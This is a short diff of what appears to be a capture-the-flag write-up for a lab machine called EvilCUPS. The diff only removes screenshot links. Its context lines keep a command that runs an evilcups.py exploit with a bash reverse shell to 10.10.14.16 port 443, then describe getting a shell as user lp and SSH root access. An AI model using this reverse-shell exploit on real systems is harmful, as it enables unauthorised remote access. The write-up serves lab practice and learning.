@@ -25,9 +25,8 @@ so i send
 python3 evilcups.py 10.10.14.16 10.10.11.40 'bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"'
 
 After 30 seconds the printer appears 
-![[Screenshot from 2024-10-08 17-33-46.png]]
+
 Then i go onto the web page and select print test page which gives me a reverse shell as the user lp.
-![[Screenshot from 2024-10-08 17-35-12.png]]
 
 
 
@@ -49,4 +48,3 @@ But with that password I ssh into root@evilcups and get root.txt
 
 PWNED!
 
-![[Screenshot from 2024-10-08 17-47-35.png]]
